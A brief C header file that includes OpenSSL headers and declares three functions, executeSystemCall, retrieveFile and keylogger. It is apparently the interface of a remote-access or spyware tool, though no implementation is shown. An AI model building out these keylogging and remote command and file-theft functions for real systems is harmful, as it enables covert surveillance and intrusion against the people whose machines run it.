#ifndef FUNCTIONALITY_H
#define FUNCTIONALITY_H

#include <limits.h>
#include <stdio.h>
#include <stdlib.h>

#include <openssl/crypto.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

void executeSystemCall(char *command);
void retrieveFile(char *file);
void keylogger();

#endif
